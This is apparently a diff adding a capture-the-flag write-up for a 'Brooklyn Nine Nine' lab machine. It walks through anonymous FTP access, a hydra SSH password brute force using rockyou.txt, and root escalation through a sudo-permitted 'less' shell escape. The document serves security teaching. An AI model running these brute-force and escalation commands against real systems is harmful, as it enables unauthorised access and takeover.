@@ -45,3 +45,40 @@ OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
 OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
 OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
 OS:S)
+We have ftp anon login so next ftp to it and get the note_to_jake.txt.
+```
+![b99](https://i.ibb.co/m9139St/d.png)
+
+```
+~$ cat note_to_jake.txt 
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+```
+so weak password huh? 
+``
+fredi@index:~$ hydra -l jake -P wordlists/rockyou.txt ssh://10.10.239.250 -t 20
+attacking ssh://10.10.239.250:22/
+[22][ssh] host: 10.10.239.250   login: jake   password: <redacted>
+``
+Then ssh into the machine.
+:~$ ssh jake@10.10.239.250
+
+## Priviledge Escalation
+```
+jake@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+    ``` 
+so no need for sudo password for "less" ok.
+https://gtfobins.github.io/gtfobins/less/
+
+jake@brookly_nine_nine:~$ sudo less /etc/profile
+!/bin/sh
+
+And Thats IT we have root ! Now go get the flags!
+
